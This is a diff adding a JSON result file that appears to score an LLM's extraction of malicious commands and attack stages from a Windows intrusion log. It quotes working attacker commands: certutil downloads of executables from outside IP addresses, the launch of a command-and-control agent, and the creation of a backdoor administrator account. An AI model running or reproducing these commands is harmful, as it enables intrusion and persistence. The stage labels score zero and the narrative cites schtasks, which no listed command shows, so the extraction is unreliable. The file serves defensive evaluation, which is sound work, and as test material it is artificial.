@@ -1,0 +1,78 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "taskkill /f /im agent.exe & certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe & cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "net user nbb nb123. /add & net localgroup administrators nbb /add",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attack begins with a payload download using certificate utilisation, followed by persistence through task scheduling and remote execution tools like Task Scheduler (schtasks). It escalates privileges via administrative account creation, establishes a Command and Control channel through a hidden service running under another scheduled task, and further executes additional payloads and reconnaissance commands.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20316,
+      "completion_tokens": 491,
+      "total_tokens": 20807,
+      "wall_clock_s": 8.49,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2857142857142857,
+      "recall": 0.2857142857142857,
+      "f1": 0.2857142857142857,
+      "tp": 2,
+      "fp": 5,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 7,
+      "fn": 6,
+      "recall_partial": 0.08333333333333333
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 20316,
+      "completion_tokens": 491,
+      "total_tokens": 20807,
+      "wall_clock_s": 8.49,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
